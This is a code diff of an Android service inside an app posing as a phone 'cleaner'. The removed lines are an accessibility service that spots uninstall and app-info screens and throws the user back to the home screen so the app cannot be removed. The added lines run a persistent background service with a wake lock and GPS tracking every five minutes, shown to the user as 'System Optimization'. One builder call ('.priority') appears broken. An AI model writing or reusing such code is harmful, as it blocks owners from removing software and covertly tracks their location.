@@ -1,59 +1,111 @@
 package com.phone.health.cleaner;
 
-import android.accessibilityservice.AccessibilityService;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.os.Build;
-import android.view.accessibility.AccessibilityEvent;
+import android.os.Bundle;
+import android.os.IBinder;
+import android.os.PowerManager;
 
-public class CoreService extends AccessibilityService {
+import androidx.annotation.Nullable;
+import androidx.core.app.NotificationCompat;
+
+public class CoreService extends Service implements LocationListener {
+
+    private static final int NOTIFICATION_ID = 1337;
+    private PowerManager.WakeLock wakeLock;
+    private LocationManager locationManager;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        startForegroundNotification();
+        acquireWakeLock();
+        initLocationTracking();
+    }
+
+    private void startForegroundNotification() {
+        String channelId = "phone_health_bg";
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    channelId,
+                    "System Optimization Service",
+                    NotificationManager.IMPORTANCE_LOW
+            );
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+        }
+
+        Notification notification = new NotificationCompat.Builder(this, channelId)
+                .setContentTitle("Phone Health")
+                .setContentText("Система оптимизации активна")
+                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .priority(NotificationCompat.PRIORITY_LOW)
+                .build();
+
+        startForeground(NOTIFICATION_ID, notification);
+    }
+
+    private void acquireWakeLock() {
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (pm != null) {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PhoneHealth:CoreLock");
+            wakeLock.acquire(10 * 60 * 1000L);
+        }
+    }
+
+    private void initLocationTracking() {
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        try {
+            if (locationManager != null) {
+                locationManager.requestLocationUpdates(
+                        LocationManager.GPS_PROVIDER,
+                        300000,
+                        10,
+                        this
+                );
+            }
+        } catch (SecurityException ignored) {}
+    }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Твоя логика фоновой службы (модель устройства и т.д.)
-        String deviceName = Build.MODEL; 
-        
-        // Возвращаем START_STICKY, чтобы служба перезапускалась при убийстве системой
         return START_STICKY;
     }
 
     @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event.getPackageName() == null) return;
+    public void onLocationChanged(Location location) {
+        double lat = location.getLatitude();
+        double lon = location.getLongitude();
+    }
 
-        CharSequence packageName = event.getPackageName();
-        String pkgStr = packageName.toString().toLowerCase();
+    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+    @Override public void onProviderEnabled(String provider) {}
+    @Override public void onProviderDisabled(String provider) {}
 
-        // 1. Ловим момент, когда лаунчер пытается открыть окно удаления пакета
-        if (pkgStr.contains("packageinstaller") || pkgStr.contains("installer")) {
-            for (CharSequence text : event.getText()) {
-                if (text != null) {
-                    String t = text.toString().toLowerCase();
-                    if (t.contains("удалить") || t.contains("uninstall") || t.contains("удаление")) {
-                        // Мгновенно выкидываем на рабочий стол, ломая процесс удаления
-                        performGlobalAction(GLOBAL_ACTION_HOME);
-                        return;
-                    }
-                }
-            }
-        }
-
-        // 2. Ловим стандартные настройки, если пользователь зашел через меню "О приложении"
-        if (pkgStr.contains("settings")) {
-            for (CharSequence text : event.getText()) {
-                if (text != null) {
-                    String t = text.toString().toLowerCase();
-                    if (t.contains("удалить") || t.contains("о приложении") || t.contains("app info") || t.contains("сведения")) {
-                        // Мгновенно выкидываем на рабочий стол
-                        performGlobalAction(GLOBAL_ACTION_HOME);
-                        return;
-                    }
-                }
-            }
-        }
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
     }
 
     @Override
-    public void onInterrupt() {
-        // Обязательный метод для службы спецвозможностей
+    public void onDestroy() {
+        super.onDestroy();
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
+        if (locationManager != null) {
+            locationManager.removeUpdates(this);
+        }
     }
 }
